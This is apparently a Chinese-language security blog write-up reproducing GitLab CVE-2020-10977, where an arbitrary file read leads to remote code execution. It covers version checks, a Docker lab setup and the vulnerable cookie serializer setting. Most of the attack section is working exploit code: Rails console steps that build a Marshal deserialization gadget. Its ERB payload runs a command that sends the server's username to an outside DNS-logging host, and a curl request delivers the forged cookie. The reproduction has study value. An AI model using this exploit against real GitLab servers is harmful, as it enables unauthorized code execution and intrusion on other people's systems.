---
layout: about
category: about
Researchname: GitLab CVE-2020-10977 任意文件读取漏洞导致的RCE
toc: true
wrench: 2022-05-05
permalink: /about/GitLab-CVE-2020-10977-RCE/
author: Bin4xin
desc: 「Gitlab」
---

## 概述

> GitLab 是一个用于仓库管理系统的开源项目，使用Git作为代码管理工具，并在此基础上搭建起来的web服务。
>
> GitLab是由GitLabInc.开发
>
> 使用MIT许可证的基于网络的Git仓库管理工具，且具有wiki和issue跟踪功能。使用Git作为代码管理工具，并在此基础上搭建起来的web服务。

### 如何查看Gitlab Web版本

```
https://git-lab-domain.com/help
```

如果没有相关版本，那么需要先登录

![2022-04-29-11.40.26.png](https://image.yjs2635.xyz/images/2022/04/29/2022-04-29-11.40.26.png)

如果您是运维人员，可以输入以下命令查看：

```bash
$ cat /opt/gitlab/embedded/service/gitlab-rails/VERSION
12.8.1-ee
```

### 零、概述

由[GitLab CVE-2020-10977 任意文件读取漏洞](/about/GitLab-CVE-2020-10977/)导致的RCE

### 0x01、环境搭建

- 服务端

```bash
docker run -it gitlab/gitlab-ee:12.8.1-ee.0 bash
```

- 攻击端：

```bash
vi /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml
/opt/gitlab/embedded/bin/runsvdir-start &
gitlab-ctl reconfigure
gitlab-rails console
```

- 攻击代码 `gitlab-rails console`

```console
> request = ActionDispatch::Request.new(Rails.application.env_config)
```

```console
> request.env["action_dispatch.cookies_serializer"] = :marshal
```

```console
> cookies = request.cookie_jar
```

```console
> erb = ERB.new("<%= `ping -c 4 $(whoami).ep8fx.i3ntq7.bnslog.top` %>")
```

```console
> depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
```

```console
> cookies.signed[:cookie] = depr
```

```console
> puts cookies[:cookie]
```

访问：

```bash
$ curl -k -vvv 'https://git-lab-domain.com/users/sign_in' -b "experimentation_subject_id={cookies[:cookie]}"
```

### 0x02、影响版本

暂未可知；

通过作者在Hackerone的报告显示，作者的测试环境是：

```
GitLab information
Version: 12.8.7-ee
Revision: 2643fd87200
```

并且通过Gitlab官方的反馈是：

- Your finding has been patched in GitLab version 12.9.1

或许结合漏洞来源，一个可参考的说法是：

> GitLab GitLab CE/EE >=8.5 and < 12.9
>
> GitLab GitLab CE >=8.5，< 12.9

### 一、思考

### 1x01、代码分析

```ruby
more /opt/gitlab/embedded/service/gitlab-rails/config/initializers/cookies_serializer.rb
# Be sure to restart your server when you modify this file.

Rails.application.config.action_dispatch.use_cookies_with_metadata = false
Rails.application.config.action_dispatch.cookies_serializer = :hybrid
```

作者提到`cookies_serializer.rb`中默认的`cookies_serializer = :hybrid`导致了RCE；

> 多说一句，插入Cookie这个利用方式和Shiro反序列化WEB利用方式有点像(o_O)

### 参考

- [Hacker one- Arbitrary file read via the UploadsRewriter when moving and issue](https://hackerone.com/reports/827052){:target="_blank"}
- [CVE-2020-10977 Gitlab任意文件读取导致远程命令执行](https://github.com/EdgeSecurityTeam/Vulnerability/blob/main/CVE-2020-10977%20Gitlab%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.md){:target="_blank"}
- [GitLab任意文件读取漏洞复现(CVE-2020-10977)](https://zhuanlan.zhihu.com/p/340584527/){:target="_blank"}
- [GitLab任意文件读取漏洞CVE-2020-10977](https://www.freebuf.com/vuls/235982.html){:target="_blank"}
- [HackTheBox — Laboratory Writeup](https://coldfusionx.github.io/posts/LaboratoryHTB/){:target="_blank"}